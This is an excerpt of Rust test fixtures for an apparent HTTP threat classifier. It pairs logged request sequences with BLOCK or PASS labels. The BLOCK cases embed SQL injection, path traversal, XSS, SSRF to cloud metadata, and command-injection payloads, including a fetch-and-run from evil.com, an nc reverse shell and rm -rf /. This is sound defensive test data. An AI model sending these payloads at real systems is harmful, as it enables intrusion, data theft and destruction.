    ...
    vec![
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /pricing 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /blog 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "GET /blog/post-welcome 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /assets/logo.svg 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 | H: Accept: image/svg+xml,*/*;q=0.8",
                "GET /search?q=hello 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            ],
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /items?sort=1' ORDER BY 3-- 500 | UA: sqlmap/1.8.1#stable | H: Accept: text/html; Connection: keep-alive",
                "GET /user?id=-1' OR 'a'='a 403 | UA: sqlmap/1.8.1#stable",
                "GET /report?filter=1'; WAITFOR DELAY '0:0:5'-- 500 | UA: sqlmap/1.8.1#stable",
                "GET /stats?year=2024' AND 1=CONVERT(int,(SELECT @@version))-- 500 | UA: sqlmap/1.8.1#stable",
                "GET /export?fmt=csv' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables-- 403 | UA: sqlmap/1.8.1#stable",
            ],
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /static?path=..%2F..%2F..%2Fvar%2Flog%2Fauth.log 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "GET /load?template=../../../../etc/hosts 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
                "GET /file?name=....//....//....//etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "GET /resource?u=file:///etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1) | H: Accept: */*; Connection: keep-alive",
                "GET /img?src=/var/www/../../etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /administrator 404 | UA: sqlmap/1.8.1#stable | H: Accept: */*; Connection: keep-alive",
                "GET /cpanel 404 | UA: sqlmap/1.8.1#stable",
                "GET /server-status 403 | UA: sqlmap/1.8.1#stable",
                "GET /actuator/env 404 | UA: sqlmap/1.8.1#stable",
                "GET /debug 404 | UA: sqlmap/1.8.1#stable | H: Accept: */*; Connection: keep-alive",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /login 401 | UA: Mozilla/5.0 Chrome/120.0",
                "GET /api/session 401 | UA: python-requests/2.31.0 | H: Accept: application/json; Content-Type: application/json",
                "GET /oauth/token 401 | UA: curl/8.4.0",
                "GET /admin/config 403 | UA: Go-http-client/1.1",
                "GET /xmlrpc.php 403 | UA: Mozilla/4.0 (compatible; MSIE 6.0)",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 5,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /post?title=<body onload=alert(document.domain)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
                "GET /wiki?edit=<input onfocus=alert(1) autofocus> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0 | H: Accept: text/html; Content-Type: application/x-www-form-urlencoded",
                "GET /feedback?text=<details open ontoggle=alert(1)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
                "GET /share?url=javascript:alert(String.fromCharCode(88,83,83)) 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /diag?cmd=127.0.0.1%26%26id 500 | UA: curl/7.88.1 | H: Accept: */*; Connection: close",
                "GET /util?arg=;wget%20http://evil.com/s.sh%20-O-%20|sh 403 | UA: curl/7.88.1",
                "GET /trace?node=1||nc%20-e%20/bin/sh%2010.0.0.1%204443 500 | UA: curl/7.88.1",
                "GET /jobs?task=%7C%20cat%20/etc/shadow 403 | UA: curl/7.88.1",
                "GET /backup?file=test.zip;rm%20-rf%20/ 500 | UA: curl/7.88.1",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /api/v1/products/42/reviews 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                "PATCH /api/v1/cart 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Content-Type: application/json; Accept: application/json; X-Request-Id: req-h1h2h3",
                "GET /api/v1/health 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json",
                "GET /api/v1/categories 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                "GET /api/v1/products/42/related 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: application/json; X-Request-Id: req-j4j5j6",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /blog/post-2 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | H: Accept: text/html; From: googlebot(at)googlebot.com",
                "GET /pricing 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /docs 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /faq 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | H: Accept: text/html; From: googlebot(at)googlebot.com",
                "GET /contact 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /staging 404 | UA: gobuster/3.6 | H: Accept: */*; Connection: keep-alive",
                "GET /api/v0 404 | UA: gobuster/3.6",
                "GET /old 404 | UA: gobuster/3.6",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        // Bruteforce с ротацией UA — 10 попыток, все 401, 7 разных UA (цикл по тем же агентам)
        ThreatCase {
            ip: "23.94.12.77",
            events: vec![
                ...
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1 | H: Content-Type: application/json; Accept: application/json",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Linux; Android 14) Chrome/120.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /hook?callback=http://127.0.0.1:9200/_search 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "GET /import?from=http://metadata.google.internal/computeMetadata/v1/ 403 | UA: curl/8.4.0 | H: Accept: */*; Connection: close",
                "GET /render?uri=http://10.0.0.5:2375/containers/json 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "GET /ssrf?u=file:///etc/passwd 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0 | H: Accept: text/html,application/xhtml+xml",
                "GET /crawl?next=http://169.254.169.254/latest/dynamic/instance-identity/document 403 | UA: curl/8.4.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 2,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /cart 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /products/42/specs 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /static/theme.css 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/css,*/*;q=0.1",
                "GET /search?q=laptop 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /account/orders 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /api/v1/feed 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: application/json; Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
                "GET /webhook?url=http://127.0.0.1:11211/ 403 | UA: curl/8.5.0",
                "GET /parse?u=http://169.254.169.254/latest/user-data 403 | UA: python-requests/2.31.0",
                "GET /static/logo.png 200 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 | H: Accept: image/png,*/*;q=0.8",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 6,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /admin 403 | UA: Go-http-client/1.1",
                "GET /catalog?page=2 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /item?id=1' OR '1'='1 500 | UA: sqlmap/1.8.2#stable",
                "GET /api/items?filter=1;DELETE%20FROM%20logs 500 | UA: python-requests/2.31.0 | H: Accept: application/json",
                "POST /session 401 | UA: curl/8.5.0",
                "GET /../../windows/win.ini 403 | UA: Go-http-client/1.1",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 5,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /catalog/accessories 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /product/usb-hub 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "PATCH /cart 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Content-Type: application/json; Accept: application/json; Origin: https://shop.example.com",
                "GET /shipping 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /thank-you 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /reports/summary?mode=SELECTED_ONLY 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /notifications 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /profile 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /help/search?q=SELECTED 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /about 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET /contact 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /terms 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET /privacy 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /rss 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                "GET /article/42/comments 200 | UA: curl/8.5.0 | H: Accept: application/json",
                "GET /jobs 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /static/main.css 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0 | H: Accept: text/css,*/*;q=0.1",
                "GET /search?q=rust 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 2,
        ...
        ThreatCase {
            ...
            events: vec![
                ...
                "GET /docs/../docs/quickstart 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
                "GET /docs/api 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
                "GET /static/vendor.js 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0 | H: Accept: */*; Sec-Fetch-Dest: script",
                "GET /docs/faq 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
                "GET /docs/changelog 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0 | H: Accept: text/html,application/xhtml+xml; Sec-Fetch-Dest: document",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
